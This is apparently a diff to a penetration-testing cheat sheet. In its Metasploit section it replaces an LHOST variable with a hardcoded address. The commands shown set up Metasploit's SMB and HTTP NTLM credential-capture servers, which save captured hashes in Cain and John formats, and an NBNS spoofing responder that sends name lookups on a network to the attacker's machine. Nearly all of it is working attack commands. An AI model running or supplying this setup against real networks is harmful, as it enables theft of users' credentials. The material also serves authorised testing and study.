@@ -41,28 +41,24 @@ root@Kali:~/Downloads# ./nbtscan-1.0.35-redhat-linux -A 192.168.0.15
 #### Metasploit
 
 ```bash
-set LHOST 10.44.1.112  # Set your local IP once, and then reuse it
-```
-
-```bash
 use auxiliary/server/capture/smb
 set CAINPWFILE /netbios/cain.
 set JOHNPWFILE /netbios/john. 
 set LOGFILE /netbios/SMB_LOG.txt
-set SRVHOST $LHOST  # Using LHOST for the server IP
+set SRVHOST 10.44.1.112 
 run
 
 use auxiliary/server/capture/http_ntlm
 set CAINPWFILE /netbios/cain-http
 set JOHNPWFILE /netbios/john-http
-set SRVHOST $LHOST  # Using LHOST for the server IP
+set SRVHOST 10.44.1.112 
 set SRVPORT 80
 set URIPATH /
 run
 
 use auxiliary/spoof/nbns/nbns_response
 set INTERFACE eth0
-set SPOOFIP $LHOST  # Using LHOST for the spoofed IP
+set SPOOFIP 10.44.1.112 
 run
 ```
 
